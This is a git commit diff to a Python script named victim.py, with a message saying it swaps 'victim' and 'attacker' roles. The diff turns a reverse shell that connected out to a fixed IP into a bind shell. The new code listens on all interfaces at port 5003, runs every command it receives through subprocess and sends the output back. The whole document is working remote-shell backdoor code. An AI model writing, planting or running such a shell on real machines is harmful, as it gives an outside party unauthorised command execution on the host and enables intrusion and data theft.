eba83e6be08997f5cf96befdad894e816a50924f
Nibba2018 <sohambiswas41@gmail.com>
2019-10-16 13:31:01 +0530

    Interchanged Victim and Attacker roles
    Created the victim as a server and attacker as a client as the victim should be active all the time.

--- victim.py
+++ victim.py
@@ -1,28 +1,38 @@
 import socket
 import subprocess
 
-SERVER_HOST = "192.168.0.6"
+SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024
 
 # create the socket object
 s = socket.socket()
-# connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
 
-# receive the greeting message
-message = s.recv(BUFFER_SIZE).decode()
-print("Server:", message)
+# bind the socket to all IP addresses of this host
+s.bind((SERVER_HOST, SERVER_PORT))
+
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+
+# accept any connections attempted
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+
+# just sending a message, for demonstration purposes
+message = "Hello and Welcome".encode()
+client_socket.send(message)
+
+
 
 while True:
     # receive the command from the server
-    command = s.recv(BUFFER_SIZE).decode()
+    command = client_socket.recv(BUFFER_SIZE).decode()
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
     # execute the command and retrieve the results
     output = subprocess.getoutput(command)
     # send the results back to the server
-    s.send(output.encode())
+    client_socket.send(output.encode())
 # close client connection
-s.close()
+client_socket.close()
